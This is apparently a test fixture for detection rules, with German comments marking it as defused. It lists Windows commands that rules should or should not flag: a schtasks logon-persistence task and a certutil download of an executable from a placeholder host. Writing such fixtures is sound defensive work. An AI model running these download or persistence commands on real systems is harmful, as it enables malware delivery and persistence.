REM LUIBUI-TESTFIXTURE: entschärft, nicht ausführen
# ruleid: LB-C07-persistenz-ps
schtasks /create /tn Hallo /tr "cmd /c echo hallo" /sc onlogon
# ruleid: LB-C03-herunterladen-ausfuehren-ps
certutil -urlcache -split -f https://nachlader.invalid/a.exe a.exe
# ok: LB-C07-persistenz-ps
schtasks /query /tn Hallo
